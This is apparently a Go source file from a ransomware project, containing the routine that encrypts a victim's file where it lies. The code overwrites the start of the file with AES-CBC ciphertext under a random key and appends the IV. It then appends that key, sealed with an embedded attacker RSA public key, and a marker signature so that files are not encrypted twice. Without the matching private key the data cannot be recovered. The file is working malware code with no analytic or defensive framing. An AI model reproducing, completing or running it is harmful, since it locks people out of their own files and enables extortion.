package internalencryptor

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/pem"
	"fmt"
	"log"
	"os"
)

// Encrypt encrypts given file
func Encrypt(filepath string, logFile *os.File) bool {

	// reader setup
	// file handle + reader object
	f, err := os.OpenFile(filepath, os.O_RDWR, 0755)
	//defer f.Close()
	r := bufio.NewReader(f)
	if err != nil {
		log.Println("[-] Error reader", err)
		f.Close()
		return false
	}

	// writer setup
	// file handle + writer object
	d, err := os.OpenFile(filepath, os.O_RDWR, 0755)
	w := bufio.NewWriter(d)
	if err != nil {
		log.Println("[-] Error writer", err)
		f.Close()
		d.Close()
		return false
	}
	_, err = d.Seek(seekStart, 0)
	if err != nil {
		log.Printf("[-] Error seeking writer for starting routine, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}

	// readrwriter object setup
	rw := bufio.NewReadWriter(r, w)

	/* check if file already encrypted */
	// seek to end of file - 8 bytes
	ds, err := f.Stat()
	_, err = f.Seek(ds.Size()-8, 0)
	if err != nil {
		log.Printf("[-] Error seeking reader for signature, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}
	signature := make([]byte, 8)
	n, err := rw.Read(signature)
	// check for signature and if file less than minimum required
	if bytes.Equal(signature, []byte{0xca, 0xfe, 0xba, 0xbe, 0xde, 0xad, 0xbe, 0xef}) || ds.Size() < dataLen+32 {
		f.Close()
		d.Close()
		return false
	}
	// seek to start of file
	_, err = f.Seek(seekStart, 0)
	rw.Reader.Reset(f)
	if err != nil {
		fmt.Println(err)
		fmt.Println(n)
		f.Close()
		d.Close()
		return false
	}

	/* start encryption routine */

	buf := make([]byte, dataLen)

	b, _ := b64.StdEncoding.DecodeString(myPublic)
	pemBlock, _ := pem.Decode(b)
	if pemBlock == nil {
	}

	publicKey, err := x509.ParsePKCS1PublicKey(pemBlock.Bytes)
	if err != nil {
		fmt.Println("error parsing public key", err)
	}

	// generate random 32 bytes from crypto PRNG
	keyaes, err := generateRandomBytes(32)
	if err != nil {
		log.Printf("[-] Error in generating random aes key, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}

	// generate random 16 bytes IV
	initializationVector := make([]byte, 16)
	_, err = rand.Reader.Read(initializationVector)
	if err != nil {
		log.Printf("[-] Couldnt init IV, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}

	// read buffer capacity from file
	n, err = rw.Read(buf)
	// AES encrypt buffer
	encryptedFile, err := encryptCBC(keyaes, buf, initializationVector)
	if err != nil {
		log.Printf("[-] Error in encryptcbc, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}
	// write encrypted bytes to file
	rw.Write(encryptedFile)
	rw.Flush()

	/* finalize setup of file */
	// seek to end of file for writing IV
	_, err = d.Seek(ds.Size(), 0)
	if err != nil {
		log.Printf("[-] Error seeking to end of file for finalizing, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}
	w.Reset(d)
	// write IV
	w.Write(initializationVector)
	w.Flush()

	// seek to end + 16 bytes for writing encrypted AES key
	_, err = d.Seek(ds.Size()+16, 0)
	if err != nil {
		log.Printf("[-] Error seeking to write encrypted AES key, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}
	w.Reset(d)

	encryptedKeyAES, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, keyaes, []byte(""))
	w.Write(encryptedKeyAES)
	w.Flush()

	_, err = d.Seek(ds.Size()+144, 0)
	if err != nil {
		log.Printf("[-] Error seeking for writing signature, file %s\n", filepath)
		f.Close()
		d.Close()
		return false
	}
	w.Reset(d)
	// write signature
	w.Write([]byte{0xca, 0xfe, 0xba, 0xbe, 0xde, 0xad, 0xbe, 0xef})
	w.Flush()
	f.Close()
	d.Close()

	return true
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}
